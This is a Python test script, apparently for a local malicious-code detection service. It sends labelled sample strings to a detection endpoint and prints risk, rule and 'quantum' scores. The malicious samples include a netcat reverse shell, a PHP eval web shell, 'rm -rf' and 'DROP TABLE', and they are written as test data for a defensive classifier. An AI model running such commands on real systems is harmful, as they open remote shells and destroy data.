"""
Test Script für Service-Integration mit optimiertem Threshold 0.60
Testet Hybrid-Logik und Shadow Mode
"""

import requests
import json
import sys
from pathlib import Path

# Service URL
SERVICE_URL = "http://localhost:8001"

def test_detection(text, description):
    """Teste einen einzelnen Request."""
    print(f"\n{'='*60}")
    print(f"Test: {description}")
    print(f"Text: {text}")
    print(f"{'='*60}")
    
    try:
        response = requests.post(
            f"{SERVICE_URL}/v1/detect",
            json={"text": text, "context": {}},
            timeout=10
        )
        response.raise_for_status()
        result = response.json()
        
        print(f"Risk Score: {result.get('risk_score', 0):.4f}")
        print(f"Confidence: {result.get('confidence', 0):.4f}")
        print(f"Category: {result.get('category', 'None')}")
        print(f"Matched Patterns: {result.get('matched_patterns', [])}")
        print(f"Latency: {result.get('latency_ms', 0):.2f} ms")
        
        metadata = result.get('metadata', {})
        print(f"\nMetadata:")
        print(f"  Method: {metadata.get('method', 'N/A')}")
        print(f"  Rule Score: {metadata.get('rule_score', 0):.4f}")
        print(f"  Quantum Score: {metadata.get('quantum_score', 'N/A')}")
        print(f"  Shadow Mode: {metadata.get('shadow_mode', 'N/A')}")
        print(f"  Quantum Available: {metadata.get('quantum_available', False)}")
        
        return result
    except requests.exceptions.RequestException as e:
        print(f"ERROR: {e}")
        return None

def test_health():
    """Teste Health Endpoint."""
    print(f"\n{'='*60}")
    print("Health Check")
    print(f"{'='*60}")
    
    try:
        response = requests.get(f"{SERVICE_URL}/health", timeout=5)
        response.raise_for_status()
        result = response.json()
        
        print(json.dumps(result, indent=2))
        return result
    except requests.exceptions.RequestException as e:
        print(f"ERROR: {e}")
        return None

def main():
    """Hauptfunktion."""
    print("="*60)
    print("Service Integration Test - Threshold 0.60")
    print("="*60)
    
    # Health Check
    health = test_health()
    if not health:
        print("\nService nicht erreichbar. Bitte starten Sie den Service:")
        print("cd detectors\\code_intent_service")
        print("python -m uvicorn main:app --host 0.0.0.0 --port 8001")
        sys.exit(1)
    
    # Test Cases
    test_cases = [
        # Malicious - sollte blockiert werden
        ("rm -rf /tmp", "Malicious: Destructive file operation"),
        ("DROP TABLE users", "Malicious: SQL destructive operation"),
        ("eval($_GET['cmd'])", "Malicious: Code execution"),
        ("nc -e /bin/bash 192.168.1.1 4444", "Malicious: Reverse shell"),
        
        # Benign - sollte erlaubt werden
        ("echo hello world", "Benign: Simple echo command"),
        ("ls -la", "Benign: Directory listing"),
        ("cat file.txt", "Benign: File read"),
        ("pwd", "Benign: Print working directory"),
        
        # Grenzfälle - sollten Quantum-CNN konsultieren
        ("rm -rf /tmp # harmless comment", "Gray Zone: Malicious with benign context"),
        ("DROP TABLE logs", "Gray Zone: SQL operation"),
    ]
    
    results = []
    for text, description in test_cases:
        result = test_detection(text, description)
        if result:
            results.append({
                "text": text,
                "description": description,
                "risk_score": result.get('risk_score', 0),
                "rule_score": result.get('metadata', {}).get('rule_score', 0),
                "quantum_score": result.get('metadata', {}).get('quantum_score'),
                "method": result.get('metadata', {}).get('method', 'N/A')
            })
    
    # Zusammenfassung
    print(f"\n{'='*60}")
    print("Zusammenfassung")
    print(f"{'='*60}")
    print(f"{'Text':<40} {'Rule':<8} {'Quantum':<10} {'Final':<8} {'Method':<25}")
    print("-" * 100)
    for r in results:
        quantum_str = f"{r['quantum_score']:.4f}" if r['quantum_score'] is not None else "N/A"
        print(f"{r['text'][:38]:<40} {r['rule_score']:<8.4f} {quantum_str:<10} {r['risk_score']:<8.4f} {r['method'][:23]:<25}")
    
    print(f"\nTotal Tests: {len(results)}")
    print(f"Service Status: {'OK' if health else 'ERROR'}")

if __name__ == "__main__":
    main()
